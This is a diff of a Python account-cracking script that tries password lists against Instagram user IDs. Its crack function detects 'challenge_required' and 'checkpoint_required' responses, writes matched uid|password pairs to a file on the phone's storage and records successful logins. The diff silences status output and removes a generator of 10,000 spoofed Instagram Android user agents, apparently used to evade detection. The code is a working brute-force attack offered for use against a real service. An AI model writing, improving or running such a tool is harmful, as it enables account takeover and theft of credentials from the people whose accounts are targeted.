@@ -83,7 +83,7 @@ def crack(uid, password_list, total_count):
     # Thread-safe counter increment
     with counter_lock:
         global loop
-        loop += 1
+        
     
     colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
               "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
@@ -167,17 +167,17 @@ def crack(uid, password_list, total_count):
                     oks.append(uid)
                     return True
             elif 'challenge_required' in response.text:
-                print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
+                #print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
                 continue
             elif 'checkpoint_required' in response.text:
-                print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} | {pw}")
+                #print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} | {pw}")
                 open("/sdcard/SUMON_INS_CP.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 continue
             else:
                 #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
-                
+        loop += 1
     except requests.exceptions.Timeout:
         #print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
         return False
@@ -188,43 +188,13 @@ def crack(uid, password_list, total_count):
         #print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
         return False
     except KeyboardInterrupt:
-        print(f"\r\033[1;93m [Interrupted] User stopped the process")
+        #print(f"\r\033[1;93m [Interrupted] User stopped the process")
         raise
     except Exception as e:
         #print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
         return False
     
     return False
-
-brands = [
-    ("INFINIX MOBILITY LIMITED", "Infinix", "Infinix X690B", "Infinix-X690B", "mt6768"),
-    ("vivo", "vivo", "vivo 1915", "vivo-1915", "qcom"),
-    ("realme", "realme", "realme RMX2185", "realme-RMX2185", "mt6765"),
-    ("Poco", "Poco", "Poco X3 Pro", "Poco-X3-Pro", "qcom"),
-    ("samsung", "samsung", "Samsung SM-A505F", "Samsung-SM-A505F", "exynos9610"),
-    ("ASUS", "ASUS", "ASUS_I005DA", "ASUS-I005DA", "qcom"),
-    ("Apple", "iPhone", "iPhone12,1", "iPhone12,1", "arm64"),
-    ("Redmi", "Redmi", "Redmi Note 9", "Redmi-Note-9", "mt6769")
-]
-
-ugenx = []
-
-for _ in range(10000):
-    brand, manufacturer, model, model_code, chipset = random.choice(brands)
-    android_version = random.randint(28, 34)  # Versi Android (Android 9 - Android 14)
-    dpi = random.choice([320, 400, 420, 480, 560, 640])
-    width = random.choice([720, 1080, 1440, 2160])
-    height = random.choice([1280, 1920, 2340, 2560])
-    lang = random.choice(["en_US", "fr_FR", "id_ID", "es_ES", "pt_BR"])
-
-    user_agent = (
-        f"Instagram {random.randint(300, 400)}.0.0.{random.randint(10, 99)}."
-        f"{random.randint(100, 999)} Android ({android_version}/{random.randint(5, 15)};"
-        f" {dpi}dpi; {width}x{height}; {brand}/{manufacturer}; {model}; {model_code}; {chipset}; {lang};"
-        f" {random.randint(100000000, 999999999)})"
-    )
-
-    ugenx.append(user_agent)
 
 def generate_random_ids(limit):
     """Generate random 6-digit IDs"""
